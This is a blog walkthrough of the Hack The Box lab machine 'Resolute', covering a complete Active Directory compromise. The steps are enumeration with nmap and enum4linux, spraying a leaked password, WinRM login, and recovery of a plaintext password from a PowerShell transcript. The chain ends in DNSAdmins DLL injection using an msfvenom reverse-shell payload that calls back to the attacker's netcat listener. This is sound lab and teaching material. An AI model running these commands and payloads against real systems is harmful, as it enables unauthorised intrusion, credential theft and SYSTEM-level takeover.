---
title: Hack The Box&#58; Resolute
permalink: /HTB/Resolute
layout: default
classes: wide
---
<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Resolute_Big.png?raw=true" class="Box_Logo" unselectable="on" />
Resolute is a medium level box that is actually pretty easy with knowledge of basic Windows and Active Directory enumeration techniques. I am a bit unfamiliar with some Command Prompt and Powershell command syntax, making some steps very time consuming. Overall, this box is pretty basic and the information from enumeration should easily connect together.

## Walkthrough

A full nmap port scan and subsequent script scan reveals the following information

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# nmap -sVC 10.10.10.169 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-12-04 03:46:50Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h47m12s, deviation: 4h37m09s, median: 7m11s
| smb2-time: 
|   date: 2021-12-04T03:46:59
|_  start_date: 2021-12-04T02:39:13
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2021-12-03T19:46:58-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

The usual services in an Active Directory computer are found here. Somthing to note is that we see the Kerberos (88) and DNS (53) services running, implicating that this computer is a domain controller. Aditionally, with the combination of the WinRM (5985), MSRPC (135, 593), LDAP (389, 636, 3268, 3269), and SMB (139, 445) services running, our next step should be to try to enumerate them. A neat tool that enumerates all of this for us (and is also built into Kali) is `enum4linux`. Running is simple, although it doesn't filter out its errors too well so reading through its output is a bit difficult.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# enum4linux 10.10.10.169

//Note that there is a lot of output that generates within the ~minute it runs, so I'll be posting the more interesting results
 =============================                                                                         
|    Users on resolute.htb    |                                                                        
 =============================  
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]           
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]             
user:[fred] rid:[0x19cd]               
user:[angela] rid:[0x19ce]               
user:[felicia] rid:[0x19cf]                  
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]                                                                                
user:[stevie] rid:[0x19d2]                                                                             
user:[claire] rid:[0x19d3]                                                                             
user:[paulo] rid:[0x19d4]                                                                              
user:[steve] rid:[0x19d5]                                                                              
user:[annette] rid:[0x19d6]                   
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]                           
user:[claude] rid:[0x19d9]                                                                             
user:[melanie] rid:[0x2775]                     
user:[zach] rid:[0x2776]                   
user:[simon] rid:[0x2777]               
user:[naoki] rid:[0x2778]
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
 [+] Found domain(s):
        [+] MEGABANK                                   
        [+] Builtin
[+] Password Info for Domain: MEGABANK        
        [+] Minimum password length: 7        
        [+] Password history length: 24
        [+] Maximum password age: Not Set                                                              
        [+] Password Complexity Flags: 000000                                                          
                [+] Domain Refuse Password Change: 0                                                   
                [+] Domain Password Store Cleartext: 0                                                 
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0                                                  
                [+] Domain Password Complex: 0                                                         
        [+] Minimum password age: 1 day 4 minutes                                                      
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes                                                        
        [+] Account Lockout Threshold: None                                                            
        [+] Forced Log off Time: Not Set
```

Combining the information with the results of the nmap scan, we can summarize that so far we know that: the computer's name is RESOLUTE, with the domain MEGABANK.LOCAL. The computer is a Windows Server 2016, and is probably a domain controller. SMB signing is also turned on, so a NTLM-relay attack won't be a potential attack vector. There is a lack of a lockout policy for incorrect password inputs. Additionally, there seems to be an interesting leak of credentials left on the description of the marko user. If marko is in the Remote Desktop User group, we can log into the computer through the WinRM service using the tool `evil-winrm`

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# evil-winrm -i 10.10.10.169 -u 'mark' -p 'Welcome123!'      

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```

This attempt is unsuccessful; it appears that our credentials are invalid. However, we do have a list of users returned from our enum4linux results and we have a potential password. We can use the tool `brutespray` to spray these credentials against SMB (brutespray does not support spraying WinRM); a valid SMB login will hopefully also mean we can authenticate into WinRM with the same credentials. To use brutespray, first we have to output an nmap scan to an xml format so that brutespray can work with it. We can do this with `nmap 10.10.10.169 -p 139,445 -oX scan.xml`. After that, compile a userlist from the enum4linux results.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# brutespray -f scan.xml -i
//The -i flag specifies interactive mode

Available services to brute-force:
Service: smbnt on port 445 with 1 hosts

Enter services you want to brute - default all (ssh,ftp,etc): smbnt
Enter the number of parallel threads (default is 2): 2
Enter the number of parallel hosts to scan per service (default is 1): 1
Would you like to specify a wordlist? (y/n): y
Enter a userlist you would like to use: userlist
Enter a passlist you would like to use: 
Would to specify a single username or password (y/n): y
Enter a password: Welcome123!
```

The output will then be sent to: `./brutespray-output`, and a success file should be found in there. Reading it with `cat ./brutespray-output/445-smbnt-success.txt` yields:

```
[+] ACCOUNT FOUND: [smbnt] Host: 10.10.10.169 User: melanie Password: Welcome123! [SUCCESS (ADMIN$ - Access Denied)]
```

This is interesting to note, because none of the other usernames had successes returned by brutespray. This means that the combination `melanie:Welcome123!` successfully authenticated into SMB, however, they were unable to access the ADMIN$ share. Now that we know a valid credential combination, we can try to authenticate into WinRM again.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> 
```

Sweet. And the user flag is in our Desktop directory too. That wasn't too bad. From here, because this is an Active Directory computer we are working with, I would like to run Bloodhound to find Privilege Escalation and Lateral Movement steps. The specifics of how to set up and run Bloodhound can be found on my blog, so I'll keep it short here. We're just going to gather some data to pass into Bloodhound.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# bloodhound-python -u 'melanie' -p 'Welcome123!' -ns 10.10.10.169 -d MEGABANK.LOCAL -c all                                                                                                             
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 27 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS02.megabank.local
INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 16S
```

This will load up a lot of .jsons that we will upload to Bloodhound. After uploading them, I like to start with a prebuilt query of "Shortest Paths to High Value Targets". We can see that our initial assumption was correct; RESOLUTE is a domain controller. Looking further, there is a second user, "ryan". Viewing the "Transitive Object Control" under the "Outbound Control Rights" of this node shows the following graph:

<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Resolute_Bloodhound.PNG?raw=true" class="postImagecontent" unselectable="on" />

Ryan is actually apart of the Contractors group which is also apart of the DNSAdmins group. There are something interesting results that come from googling things related to the DNSAdmin and Privilege Escalation. Essentially, if the DNSAdmin has the capability to turn on and off the DNS service (which they don't be default, but it seems to be a common configuration), then they can inject a malicious dll into the DNS service that will be run once the service is restart. The DNS service runs as SYSTEM, so if we can inject a dll that launches a reverse shell and restart the DNS service, we can get SYSTEM. This seems like a plausible attack vector given our current information, but we need to get to ryan first to test this. Back onto melanie, some basic enumeration reveals some PowerShell command history left in the root directory.

```
*Evil-WinRM* PS C:\> cmd /c "dir /adh /s"
 Volume in drive C has no label.                                                                       
 Volume Serial Number is 923F-3611                                                                     

 Directory of C:\                                                                                      

12/03/2019  06:40 AM    <DIR>          $RECYCLE.BIN
09/25/2019  09:17 AM    <JUNCTION>     Documents and Settings [C:\Users]
09/25/2019  09:48 AM    <DIR>          ProgramData
12/03/2019  06:32 AM    <DIR>          PSTranscripts                                                   
09/25/2019  09:17 AM    <DIR>          Recovery
09/25/2019  05:25 AM    <DIR>          System Volume Information
0 File(s)              0 bytes

//The command ran the "dir /adh /s" command under cmd.exe (command prompt). The dir command itself was actually configured to do a //recursive search for hidden directories and files. There's a lot more results, but the PSTranscripts should stand out immediatly
```

Traversing through this directory eventually leads us to a file, and when read it reveals the following information:

```
*Evil-WinRM* PS C:\> type C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************   
Windows PowerShell transcript start
Start time: 20191203063201                                                                             
Username: MEGABANK\ryan      
RunAs User: MEGABANK\ryan  
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)                                        
**********************   
Command start time: 20191203063515                                                                     
**********************                                                                                 
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
                                                   
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
//filtered for readability
```

And these credentials work!

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]
└─# evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'                                                                        
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

Now we get to test our brainstormed attack vector. But before we do that, a little bit of enumeration into ryan's Desktop shows a note that says that system changes affecting everything but the administrator account will be reverted after a minute. So we're going to try to chain the commands that we will use to make sure nothing gets messed up. First, we need to generate a dll payload, then point the serverlevelplugindll to the malicious dll, then restart the DNS service. While this all happens, on our attacking machine, we set up a netcat listener to catch the callback. First, for payload generation and listener setup, run the following commands:

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]                                                                                         
└─# nc -nvlp 4444
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]                                                       
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 --platform=windows -f dll > bruh.dll
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute]                                                                                         
└─# smbserver.py share .

//make sure to modify the LHOST to your ip, the LPORT to your port of choice, and the dll to the name of your choice
```

Then, as ryan, run these commands:

```
*Evil-WinRM* PS C:\> cmd /c "dnscmd RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll \\10.10.16.6\\share\bruh.dll && sc \\RESOLUTE stop dns && sc \\RESOLUTE start dns"

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

//Note that rather than copying the file directly on the system, it is instead accessed through smb. This is to avoid any potential //antivirus that will recognize the payload if it were to be placed on the machine directly. Also make sure that the call to the smb //share matches your ip address that you started the smb server on.
```

Checking back on our listener, we got SYSTEM. Sweet.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Resolute/tmp]
└─# nc -nvlp 4444                                                                                                                         
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.169.
Ncat: Connection from 10.10.10.169:59271.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

## Afterthoughts

Overall, this box is pretty simple since most of the steps lined up. The enumeration for the PowerShell transcript took some time for me personally since I didn't know how to search for hidden files. Additionally, the DNSAdmins group Privilege Escalation only worked (in this scenario) because we had the privilege to restart the service, which isn't enabled by default. Overall, I enjoyed this box a lot, and while its rather basic, I believe that's what makes it solid for learning Windows and Active Directory.

## Bonus

After doing some extra digging on some articles related to the Privilege Escalation, I found some interesting information. First of all, because our dll was generated and coded for the sole purpose of creating a reverse shell, it actually destroys the DNS service because, due to our dll, the DNS service never finishes starting up. The note left on ryan's desktop talking about how the box resets itself actually fixes this. Therefore, in some actual real world environment, this would not be a good way to go about things as crashing company infrastructure is a bad thing. However, with some coding knowledge (that I lack), it is possible to implement threading into the dll and make DNS function normally while also loading the reverse shell.

Another thing I ran into is that, while by default the DNSAdmins group does not have privileges to restart the DNS service as it did in this box using sc.exe (Service Control), this isn't necessary to accomplish this type of attack. The dnscmd executable itself can restart the DNS service, and the DNSAdmins group can use the executable this way by default. Therefore, another set of chained commands that could be used on the box are:

```
*Evil-WinRM* PS C:\> cmd /c "dnscmd RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll \\10.10.16.6\\share\bruh.dll && dnscmd RESOLUTE.MEGABANK.LOCAL /Restart"

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

RESOLUTE.MEGABANK.LOCAL completed successfully.
Command completed successfully.
```

However, the attack vector is not limited to just the DNSAdmins group. Any group with some sort of write privilege on the DNS service object and with the capability to restart the DNS service can accomplish this attack vector. Aside from limiting the privileges of users and the DNSAdmins group, it is possible to also add some sort of check on the dll being configured to further mitigate the possibility of a dll injection occuring.

-Dylan Tran 12/5/2021

